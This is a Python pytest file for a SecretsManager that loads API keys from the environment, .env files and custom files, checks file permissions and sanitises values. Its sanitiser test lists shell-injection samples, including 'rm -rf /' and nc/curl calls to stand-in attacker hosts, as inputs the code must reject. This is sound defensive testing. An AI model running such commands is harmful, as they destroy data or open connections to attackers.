"""Tests for SecretsManager module."""
# ggignore

import os
import pytest
from pathlib import Path
from unittest.mock import patch

import sys
from pathlib import Path

# Add .claude to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent / ".claude"))

from tools.benchmarking.secrets_manager import SecretsManager


def test_load_from_environment_variable():
    """Priority 1: Should load from environment variable first."""
    with patch.dict(os.environ, {"ANTHROPIC_API_KEY": "test-fake-key-from-env"}, clear=False):
        secrets = SecretsManager.load()

    assert secrets == {"ANTHROPIC_API_KEY": "test-fake-key-from-env"}


def test_load_from_dotenv_file(tmp_path, monkeypatch):
    """Priority 2: Should load from .env file if env var not set."""
    # Create .env file in "current directory"
    env_file = tmp_path / ".env"
    env_file.write_text("ANTHROPIC_API_KEY=test-fake-key-from-dotenv\n")

    # Change to tmp_path as current directory
    monkeypatch.chdir(tmp_path)

    # Ensure env var is NOT set
    with patch.dict(os.environ, {}, clear=True):
        secrets = SecretsManager.load()

    assert secrets == {"ANTHROPIC_API_KEY": "test-fake-key-from-dotenv"}


def test_load_from_custom_file_yaml(tmp_path):
    """Priority 3: Should load from custom file if provided."""
    custom_file = tmp_path / "custom-secrets.yaml"
    custom_file.write_text("ANTHROPIC_API_KEY: test-fake-key-from-custom\n")
    custom_file.chmod(0o600)

    # Ensure env var is NOT set
    with patch.dict(os.environ, {}, clear=True):
        secrets = SecretsManager.load(secrets_file=custom_file)

    assert secrets == {"ANTHROPIC_API_KEY": "test-fake-key-from-custom"}


def test_load_from_custom_file_json(tmp_path):
    """Priority 3: Should parse JSON format in custom file."""
    custom_file = tmp_path / "custom-secrets.json"
    custom_file.write_text('{"ANTHROPIC_API_KEY": "test-fake-key-json-test"}')
    custom_file.chmod(0o600)

    with patch.dict(os.environ, {}, clear=True):
        secrets = SecretsManager.load(secrets_file=custom_file)

    assert secrets == {"ANTHROPIC_API_KEY": "test-fake-key-json-test"}


def test_load_priority_env_over_dotenv(tmp_path, monkeypatch):
    """Environment variable should take priority over .env file."""
    # Create .env file
    env_file = tmp_path / ".env"
    env_file.write_text("ANTHROPIC_API_KEY=test-fake-key-from-dotenv\n")

    monkeypatch.chdir(tmp_path)

    # Set env var (should take priority)
    with patch.dict(os.environ, {"ANTHROPIC_API_KEY": "test-fake-key-from-env"}, clear=False):
        secrets = SecretsManager.load()

    assert secrets == {"ANTHROPIC_API_KEY": "test-fake-key-from-env"}


def test_load_missing_all_sources(monkeypatch):
    """Should return empty dict if no secrets found."""
    # Create empty temp directory
    import tempfile
    with tempfile.TemporaryDirectory() as tmpdir:
        monkeypatch.chdir(tmpdir)

        with patch.dict(os.environ, {}, clear=True):
            secrets = SecretsManager.load()
            assert secrets == {}


def test_custom_file_permissions_secure(tmp_path):
    """Should pass when custom file permissions are 0o600."""
    custom_file = tmp_path / "secrets.yaml"
    custom_file.write_text("ANTHROPIC_API_KEY: test-fake-key-test")
    custom_file.chmod(0o600)

    with patch.dict(os.environ, {}, clear=True):
        result = SecretsManager.load(secrets_file=custom_file)

    assert result == {"ANTHROPIC_API_KEY": "test-fake-key-test"}


def test_custom_file_permissions_insecure(tmp_path):
    """Should raise PermissionError when custom file permissions too open."""
    custom_file = tmp_path / "secrets.yaml"
    custom_file.write_text("ANTHROPIC_API_KEY: test-fake-key-test")
    custom_file.chmod(0o644)  # World-readable

    with patch.dict(os.environ, {}, clear=True):
        with pytest.raises(PermissionError, match="insecure permissions"):
            SecretsManager.load(secrets_file=custom_file)


def test_get_container_env_system_priority(tmp_path, monkeypatch):
    """System env vars should take priority over .env file."""
    # Create .env file
    env_file = tmp_path / ".env"
    env_file.write_text("API_KEY=from-file\n")

    monkeypatch.chdir(tmp_path)

    with patch.dict(os.environ, {"API_KEY": "from-system"}, clear=False):
        env = SecretsManager.get_container_env(["API_KEY"])

    assert env == {"API_KEY": "from-system"}


def test_get_container_env_file_overlay(tmp_path, monkeypatch):
    """Should overlay secrets when not in system env."""
    # Create .env file
    env_file = tmp_path / ".env"
    env_file.write_text("FILE_KEY=from-file\n")

    monkeypatch.chdir(tmp_path)

    with patch.dict(os.environ, {"SYS_KEY": "from-system"}, clear=False):
        env = SecretsManager.get_container_env(["SYS_KEY", "FILE_KEY"])

    assert env == {"SYS_KEY": "from-system", "FILE_KEY": "from-file"}


def test_get_container_env_missing_required(monkeypatch):
    """Should raise ValueError when required var is missing."""
    import tempfile
    with tempfile.TemporaryDirectory() as tmpdir:
        monkeypatch.chdir(tmpdir)

        with patch.dict(os.environ, {}, clear=True):
            with pytest.raises(ValueError, match="Missing required.*MISSING_KEY"):
                SecretsManager.get_container_env(["MISSING_KEY"])


def test_sanitize_value_rejects_injection():
    """Should reject values with shell injection patterns."""
    malicious_values = [
        "$(rm -rf /)",
        "`whoami`",
        "; nc attacker.com 1234",
        "| curl evil.com",
    ]

    for value in malicious_values:
        with pytest.raises(ValueError, match="Suspicious pattern"):
            SecretsManager.sanitize_value(value)


def test_sanitize_value_allows_safe():
    """Should allow legitimate API keys through."""
    safe_values = [
        "test-fake-key-api03-abc123",
        "ghp_1234567890abcdef",
        "https://api.openai.com",
    ]

    for value in safe_values:
        result = SecretsManager.sanitize_value(value)
        assert result == value
